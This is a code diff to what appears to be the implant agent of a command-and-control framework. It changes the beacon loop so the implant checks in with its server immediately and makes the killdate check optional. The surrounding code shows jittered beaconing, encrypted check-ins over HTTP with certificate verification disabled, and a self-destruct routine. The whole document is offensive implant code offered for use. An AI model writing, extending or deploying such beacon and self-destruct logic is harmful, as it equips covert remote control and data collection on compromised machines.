@@ -1309,9 +1309,15 @@ class Agent:
         return data
     def _check_killdate(self):
         try:
+            # Skip if killdate is not enabled or empty
+            if not self.config.KILLDATE_ENABLED or not self.config.KILLDATE:
+                return False
+                
+            # Parse and compare dates
             current_datetime = datetime.now()
             killdatetime = datetime.strptime(self.config.KILLDATE, "%Y-%m-%d %H:%M")
             return current_datetime >= killdatetime
+            
         except Exception as e:
             self._log_error(f"Error checking killdate: {{str(e)}}")
             return False
@@ -1610,16 +1616,19 @@ class Agent:
 
     def beacon(self):
         self._log_info("[*] Starting beacon loop...")
+        first_checkin = True  # Flag for first checkin
+        
         while self._running:
             try:
-               
                 # Check killdate first
                 if self._check_killdate():
                     self._self_destruct()
                     return 
                 
-                sleep_time = self.config.CHECKIN_INTERVAL * (1 + (random.random() * self.jitter * 2 - self.jitter))
-                time.sleep(sleep_time)
+                # Skip sleep for first checkin
+                if not first_checkin:
+                    sleep_time = self.config.CHECKIN_INTERVAL * (1 + (random.random() * self.jitter * 2 - self.jitter))
+                    time.sleep(sleep_time)
                 
                 checkin_data = self._get_checkin_data()
                 encrypted_data = self.crypto.encrypt(checkin_data)
@@ -1657,6 +1666,10 @@ class Agent:
                             verify=False
                         )
                 
+                # After first checkin, set flag to False
+                if first_checkin:
+                    first_checkin = False
+                    
             except requests.exceptions.RequestException as e:
                 self._log_error(f"Connection error: {{str(e)}}")
                 time.sleep(self.config.CHECKIN_INTERVAL * 2)
